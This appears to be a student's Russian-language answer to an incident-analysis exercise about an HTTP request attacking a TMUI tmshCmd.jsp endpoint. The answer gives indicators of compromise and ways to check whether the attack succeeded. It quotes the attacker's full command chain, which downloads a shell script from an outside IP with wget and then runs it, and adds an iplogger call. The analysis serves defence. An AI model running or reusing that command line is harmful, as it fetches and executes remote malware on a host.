# В файле task1.txt привёден текст HTTP-запроса.  
## 1. Опишите, что происходит (чего добиваются атакующие).  
В HTTP запросе пытаются реализовать удалённое выполнение команд (RCE):

Команды которые хотят выполнить:

wget http://136.144.41.3/igipdmcdmsklcmk/ohsitsvegawellrip.sh; chmod 777 ohsitsvegawellrip.sh; sh ohsitsvegawellrip.sh; wget https://iplogger.org

1) wget http://136.144.41.3/igipdmcdmsklcmk/ohsitsvegawellrip.sh - установка скрипта.
2) chmod 777 ohsitsvegawellrip.sh - выдача полных прав скрипту.
3) sh ohsitsvegawellrip.sh - выполнение скрипта.
4) wget https://iplogger.org - дополнительная загрузка ip логера для мониторинга и проведения доп. атак.

## 2. Выделите признаки, по которым понятно, что происходит атака.  
В ссылке присутствует /.. , это может указывать на обход механизма безопасности, такого как доступ к файлам.

В запросе устанавливается скрипт с неизвестного ip адреса по незащищенному соединению, потом этому скрипту выдаются ПОЛНЫЕ права (не только право на исполнение), далее он запускается.

После этого дополнительно устанавливается iplogger.

## 3. Выделите IoС'и, которые могут быть использованы для выявления подобной активности в будущем.  
136.144.41.3 - ip адрес с которого устанавливается вредоносный скрипт

Команды wget, chmod, и sh в запросах могут служить индикатором попыток удалённой загрузки и выполнения вредоносных скриптов.

## 4. Укажите, каким образом можно удостовериться в том, удалось ли атакующим достигнуть того, чего они добивались этим запросом.   
Проверить логи веб-сервера на наличие успешных запросов к tmui/locallb/workspace/tmshCmd.jsp

Проверить наличие загруженного файла ohsitsvegawellrip.sh

Убедиться, что на сервере не запущены подозрительные процессы, которые могли быть инициированы этим скриптом.

Анализировать сетевой трафик на предмет исходящих соединений к IP-адресу 136.144.41.3

